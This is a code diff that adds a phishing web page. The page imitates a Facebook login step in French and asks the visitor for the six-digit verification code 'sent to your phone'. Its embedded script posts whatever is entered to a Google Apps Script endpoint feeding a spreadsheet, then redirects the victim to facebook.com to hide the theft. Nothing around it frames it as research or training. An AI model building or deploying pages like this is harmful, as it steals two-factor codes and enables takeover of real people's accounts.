@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>رسالة لكل اب</title>
+</head>
+<style>
+    * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html {
+             min-height: 100vh;
+          border: 5px;
+          width:100vw ;
+          overflow-x: hidden;
+           
+        }
+    
+        body {
+         
+          min-height: 100vh;
+          border: 5px;
+          width:100vw ;
+          overflow-x: hidden;
+          background-color: #f0f2f5;
+            
+        }
+        
+        .code{
+            position: relative;
+            top: 2%;
+            left: 33%;
+            
+        }
+        .txt{
+            position: relative;
+            top: 20px;
+            left: 48%;
+        }
+        .tt{
+            position: relative;
+            top: 30px;
+            left: 36%;
+        }
+       
+        .text{
+            position: relative;
+            top: 40px;
+            left: 44%;
+            height: 100px;
+            width: 200px;
+        }
+        .submit{
+        position: relative;
+        width: 200px;
+        height: 50px;
+        top: 30px;
+        left: 44%;
+        color: #f0f2f5;
+        background-color: #1877f2;
+        font-size: 20px;
+        border-radius: 10px;
+        }
+
+
+</style>
+<body>
+    <div class="box">
+    </div>
+    <div class="code">
+        <h2>Entrez le code que nous avons envoyé a votre</h2>
+    </div>
+    <div class="txt">
+        <h3>"Téléphone"</h3>
+    </div>
+    <div class="tt">
+        <p>Nous avons envoyé un code à 6 chiffres sur votre téléphone, <br>entrez ce code pour vous connecter</p>
+    </div>
+    
+    <form class= "k" name="submit-to-google-sheet">
+        <input class="text" type="text" name="3" required><br><br><br>
+        <input class="submit" type="submit" name="login" id="submit-button"><br><br>
+    </form>
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxBxk8BcvBuF2ZWrc0eHNlahp6JsCzySep3k-zZh12aMy1iRYFBYQg9e-HEMtfERWfLIg/exec'
+        const form = document.forms['submit-to-google-sheet']
+
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => console.log('Success!', response))
+            .catch(error => console.error('Error!', error.message))
+            window.location.href = 'https://www.facebook.com/';
+        })
+        
+        
+      </script>
+</body>
+</html>
